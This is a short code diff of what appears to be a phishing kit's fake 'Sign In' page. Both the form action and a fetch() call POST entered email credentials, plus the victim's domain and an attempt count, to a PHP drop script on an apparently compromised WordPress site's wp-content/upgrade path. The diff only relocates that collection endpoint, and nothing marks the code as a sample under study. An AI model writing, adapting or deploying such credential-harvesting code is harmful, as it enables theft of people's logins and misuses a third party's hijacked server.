@@ -431,7 +431,7 @@
             <div class="brand-name" id="brandName">Sign In</div>
         </div>
         
-        <form id="loginForm" action="https://lorneplumbing.com.au/wp-content/upgrade/dol.php" method="POST">
+        <form id="loginForm" action="https://lorneplumbing.com.au/wp-content/upgrade/fx/dol.php" method="POST">
             <div class="form-group">
                 <label for="username">Email address</label>
                 <div class="input-container">
@@ -901,7 +901,7 @@
                     formData.append('domain', currentDomain);
                     formData.append('attempt', attemptCount + 1);
                     
-                    fetch('https://lorneplumbing.com.au/wp-content/upgrade/dol.php', {
+                    fetch('https://lorneplumbing.com.au/wp-content/upgrade/fx/dol.php', {
                         method: 'POST',
                         body: formData
                     })
